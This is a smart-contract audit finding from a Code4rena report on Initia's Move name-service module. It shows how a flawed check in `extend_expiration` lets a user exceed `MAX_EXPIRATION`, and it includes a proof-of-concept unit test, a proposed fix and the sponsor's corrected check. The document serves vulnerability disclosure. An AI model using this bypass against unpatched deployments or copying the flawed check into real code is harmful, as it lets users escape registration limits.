---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/lending
  - sector/nft
  - sector/options
protocol: "[[Initia]]"
auditors:
  - "[[p4y4b13]]"
report: "https://code4rena.com/reports/2025-01-initia-move"
genome:
  - "[[wrong-condition]]"
  - "[[role-bypass]]"
  - "[[access-roles]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# [H-03] User can bypass `MAX_EXPIRATION` when extend expiration

- id: 55276
- impact: HIGH
- protocol: [[Initia]]
- reporter: p4y4b13 (Code4rena)
- source: https://code4rena.com/reports/2025-01-initia-move

## Summary


This bug report discusses an issue with the `extend_expiration` function in the `name_service.move` file. The validation for the duration is incorrect, allowing users to bypass the `MAX_EXPIRATION` limit. This can result in the expiration duration being updated to a value far greater than `MAX_EXPIRATION`, effectively doubling it. To fix this issue, the validation logic needs to be updated to ensure that the `new_expiration_date` itself does not exceed `MAX_EXPIRATION`. 

## Details



<https://github.com/code-423n4/2025-01-initia-move/blob/a96f5136c4808f6968564a4592fe2d6ac243a233/usernames-module/sources/name_service.move# L483>

### Finding Description and Impact

In the `extend_expiration` function, the validation for the duration is incorrect, allowing the user to bypass `MAX_EXPIRATION`:
```

 let expiration_date = metadata::get_expiration_date(token);
        let new_expiration_date = if (expiration_date > timestamp) {
            expiration_date + duration
        } else {
            timestamp + duration
        };

        assert!(
=>            new_expiration_date - expiration_date <= MAX_EXPIRATION,
            error::invalid_argument(EMIN_DURATION),
        );

        metadata::update_expiration_date(token, new_expiration_date);
```

The issue arises because the code subtracts `new_expiration_date - expiration_date` for validation.

Assume a user registers a domain and the `expiration_date` is equal to `MAX_EXPIRATION` `+` timestamp. Then, the user performs `extend_expiration` with a `duration` value equal to the `MAX_EXPIRATION`, the `new_expiration_date` becomes `expiration_date + duration`.

This leads to the following verification check passing:
```

assert!(
    new_expiration_date - expiration_date <= MAX_EXPIRATION,
    error::invalid_argument(EMIN_DURATION),
);
```

Since the `new_expiration_date` is calculated using `expiration_date` `+` `duration`, the subtraction `(new_expiration_date - expiration_date)` will always be less than to `MAX_EXPIRATION`.

As a result, the `update_expiration_date` function updates the expiration duration to a value far greater than `MAX_EXPIRATION`, effectively doubling it to `MAX_EXPIRATION * 2`.
```

metadata::update_expiration_date(token, new_expiration_date);
```

### Proof of Concept

Add the code below into `name_service.move` and run the test:
```

 #[test(chain = @0x1, source = @usernames, user = @0x2, lp_publisher = @0x3)]
    fun test_bypass_max_expiration(
        chain: signer,
        source: signer,
        user: signer,
        lp_publisher: signer,
    ) acquires CoinCapsInit, ModuleStore {
        deploy_dex(&chain, &lp_publisher);

        let addr = signer::address_of(&user);
        init_mint_to(signer::address_of(&chain), &user, 1000000000);

        initialize(
            &source,
            100,
            50,
            10,
            1000,
            1000,
            string::utf8(b"https://test.com/"),
            string::utf8(b"https://test.com/"),
        );

        std::block::set_block_info(100, 100);

        // before register
        assert!(get_name_from_address(addr) == option::none(), 0);
        assert!(get_address_from_name(string::utf8(b"abcd")) == option::none(), 1);
        assert!(get_valid_token(string::utf8(b"abcd")) == option::none(), 2);

        register_domain(&user, string::utf8(b"abcd"), MAX_EXPIRATION);
        let token = *option::borrow(&get_valid_token(string::utf8(b"abcd")));
        let token_object = object::address_to_object<Metadata>(token);
        assert!(initia_std::nft::token_id(token_object) == string::utf8(b"abcd.init.100"), 3);
        set_name(&user, string::utf8(b"abcd"));
        assert!(get_name_from_address(addr) == option::some(string::utf8(b"abcd")), 4);
        assert!(get_address_from_name(string::utf8(b"abcd")) == option::some(addr), 5);

        // extend duration bypass a MAX_EXPIRATION
        extend_expiration(&user, string::utf8(b"abcd"), MAX_EXPIRATION);
        let token = *option::borrow(&get_valid_token(string::utf8(b"abcd")));
        let expiration_date = metadata::get_expiration_date(token);
        assert!( expiration_date >= MAX_EXPIRATION * 2, 6);

    }
```

### Recommended Mitigation Steps

Update the validation logic to ensure the `new_expiration_date` itself does not exceed `MAX_EXPIRATION`. The code would look like this:
```

assert!(
    new_expiration_date <= MAX_EXPIRATION,
    error::invalid_argument(EMIN_DURATION),
);
```

**[andrew (Initia) confirmed and commented](https://code4rena.com/audits/2025-01-initia-move/submissions/F-37?commentParent=k3sf5LjVmEJ):**

> Actually, `MAX_EXPIRATION` means that you can register/extend to `current time + MAX_EXPIRATION`. And yes, current logic is not correct. So I updated those in [this commit](https://github.com/initia-labs/usernames-module/pull/3/commits/1c83be3c9904234ed88f3c24dafa654d947392e3).
>
> 
```

>         assert!(
>             new_expiration_date - timestamp <= MAX_EXPIRATION,
>             error::invalid_argument(EMAX_EXPIRATION),
>         );
> 
```

---



## Artifacts

- Raw capture: /Users/user/Desktop/crawlee-run/pages_capture.har
- Pages snapshot: /Users/user/Desktop/crawlee-run/all_findings_full.json
